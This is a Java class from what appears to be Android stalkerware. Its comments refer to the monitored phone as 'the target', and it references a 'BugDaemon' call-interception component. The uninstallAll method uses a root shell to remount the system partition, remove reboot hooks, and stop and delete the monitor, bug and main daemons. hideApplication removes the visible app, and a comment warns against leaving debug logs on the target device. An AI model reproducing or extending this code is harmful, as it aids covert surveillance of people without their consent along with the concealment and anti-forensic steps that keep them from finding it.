package com.fx.maind;

import com.fx.daemon.DaemonHelper;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.MainDaemon;
import com.fx.pmond.ref.MonitorDaemon;
import com.vvt.callmanager.ref.BugDaemon;
import com.vvt.logger.FxLog;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.ShellUtil;

public class ServiceManager {
	private static final String TAG = "ServiceManager";
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	private static ServiceManager mInstance;
	
	public static ServiceManager getInstance() {
		if (mInstance == null) {
			mInstance = new ServiceManager();
		}
		return mInstance;
	}
	
	/**
	 * Don't try to write any debugging logs here since it can be left undeleted on the target  
	 */
	public void uninstallAll(String packageName) {
		if (LOGV) FxLog.v(TAG, "uninstallAll # ENTER ...");
		try {
			
			if (packageName != null) {
				ShellUtil.uninstallApk(packageName);
			}
			else {
				FxLog.e(TAG, "uninstallAll # Product package name not found!!");
			}
			
			MainDaemon mainDaemon = new MainDaemon();
	    	MonitorDaemon monitorDaemon = new MonitorDaemon();
			BugDaemon bugDaemon = new BugDaemon();
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Remount system as read-write");
			ShellUtil.remountFileSystem(true);
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Remove reboot hook");
			DaemonHelper.removeRebootHook();
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Stop monitor daemon");
			monitorDaemon.stopDaemon();
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Stop bug daemon");
			bugDaemon.stopDaemon();
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Remove monitor daemon");
			monitorDaemon.removeNativeLibrary();
			monitorDaemon.removeDaemon();
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Remove bug daemon");
			bugDaemon.removeNativeLibrary();
			bugDaemon.removeDaemon();
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Remove main daemon");
			mainDaemon.removeNativeLibrary();
			mainDaemon.removeDaemon();
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Remount system as read-only");
			ShellUtil.remountFileSystem(false);
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Stop monitor daemon");
			mainDaemon.stopDaemon();
		}
		catch (CannotGetRootShellException e) {
			FxLog.e(TAG, "uninstallAll # Error: %s", e);
		}
		if (LOGV) FxLog.v(TAG, "uninstallAll # EXIT ...");
	}
	
	public void hideApplication(String packageName) {
		if (LOGV) FxLog.v(TAG, "hideApplication # ENTER ...");
		
		if (LOGV) FxLog.v(TAG, "hideApplication # packageName :" + packageName);
		
		if (packageName != null) {
			ShellUtil.uninstallApk(packageName);
		}
		else
			if (LOGV) FxLog.e(TAG, "hideApplication # packageName is null");
		
		if (LOGV) FxLog.v(TAG, "hideApplication # EXIT ...");
	}
}
